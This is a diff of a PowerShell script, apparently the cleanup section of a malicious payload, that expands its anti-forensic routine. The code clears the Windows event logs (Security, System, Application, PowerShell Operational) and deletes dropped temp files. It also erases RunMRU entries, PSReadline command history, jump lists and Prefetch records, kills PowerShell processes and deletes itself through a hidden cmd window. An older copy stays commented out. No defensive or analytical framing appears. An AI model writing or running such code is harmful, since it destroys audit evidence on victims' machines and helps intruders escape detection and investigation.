@@ -115,6 +115,31 @@ catch {
     Write-Warning "Critical Error: $($_.Exception.Message)"
 }
 
+# finally {
+#     try {
+#         $v_logName = "Microsoft-Windows-PowerShell/Operational"
+#         [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($v_logName)
+#     } catch { }
+
+#     $v_logs = @("System", "Application", "Security")
+#     foreach ($v_log in $v_logs) {
+#         try {
+#             Clear-EventLog -LogName $v_log -ErrorAction SilentlyContinue
+#         } catch { }
+#     }
+
+#     Get-ChildItem "$env:TEMP\*" -Include "*.exe","*.txt","*.zip","*.tmp" | 
+#         Where-Object { $_.Name -like "*$r_nm*" -or $_.Name -like "ani_*" } | 
+#         Remove-Item -Force -ErrorAction SilentlyContinue
+
+#     $v_currentScript = $MyInvocation.MyCommand.Definition
+#     if ($v_currentScript) {
+#         $v_cleanupCmd = "/c timeout 3 & taskkill /F /IM powershell.exe & del `"$v_currentScript`""
+#         Start-Process "cmd.exe" -ArgumentList $v_cleanupCmd -WindowStyle Hidden
+#     }
+# }
+
+
 finally {
     try {
         $v_logName = "Microsoft-Windows-PowerShell/Operational"
@@ -123,18 +148,44 @@ finally {
 
     $v_logs = @("System", "Application", "Security")
     foreach ($v_log in $v_logs) {
-        try {
-            Clear-EventLog -LogName $v_log -ErrorAction SilentlyContinue
-        } catch { }
+        try { Clear-EventLog -LogName $v_log -ErrorAction SilentlyContinue } catch { }
+    }
+
+    $v_runRegistry = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+    if (Test-Path $v_runRegistry) {
+        Remove-ItemProperty -Path $v_runRegistry -Name * -ErrorAction SilentlyContinue
+    }
+
+    try {
+        $v_hPath = (Get-PSReadlineOption).HistorySavePath
+        if (Test-Path $v_hPath) { Clear-Content $v_hPath -Force }
+    } catch { }
+
+    $v_jumpList = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
+    if (Test-Path $v_jumpList) {
+        Get-ChildItem $v_jumpList -Filter "*.automaticDestinations-ms" | Remove-Item -Force -ErrorAction SilentlyContinue
     }
 
     Get-ChildItem "$env:TEMP\*" -Include "*.exe","*.txt","*.zip","*.tmp" | 
         Where-Object { $_.Name -like "*$r_nm*" -or $_.Name -like "ani_*" } | 
         Remove-Item -Force -ErrorAction SilentlyContinue
 
+    Clear-History -ErrorAction SilentlyContinue
+
     $v_currentScript = $MyInvocation.MyCommand.Definition
     if ($v_currentScript) {
         $v_cleanupCmd = "/c timeout 3 & taskkill /F /IM powershell.exe & del `"$v_currentScript`""
         Start-Process "cmd.exe" -ArgumentList $v_cleanupCmd -WindowStyle Hidden
     }
+
+    try {
+        $v_prefetchPath = "$env:SystemRoot\Prefetch"
+        if (Test-Path $v_prefetchPath) {
+            Get-ChildItem -Path $v_prefetchPath -Filter "*$r_nm*.pf" | 
+                Remove-Item -Force -ErrorAction SilentlyContinue
+            
+            Get-ChildItem -Path $v_prefetchPath -Filter "POWERSHELL.EXE*.pf" | 
+                Remove-Item -Force -ErrorAction SilentlyContinue
+        }
+    } catch { }
 }
